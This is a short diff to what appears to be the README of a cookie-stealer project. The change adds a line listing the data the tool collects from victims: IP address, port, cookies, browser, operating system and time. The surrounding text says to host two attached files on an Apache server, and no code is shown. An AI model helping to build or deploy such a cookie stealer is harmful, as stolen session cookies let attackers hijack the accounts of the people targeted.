@@ -1,4 +1,5 @@
 # Most Advanced Cookie Stealer Script
+#Fetches User IP, Application Port Number, User Cookies, User Browser Name, User Operating System Name, Date & Time
 
 1. Host the two attached files in an apache server
 
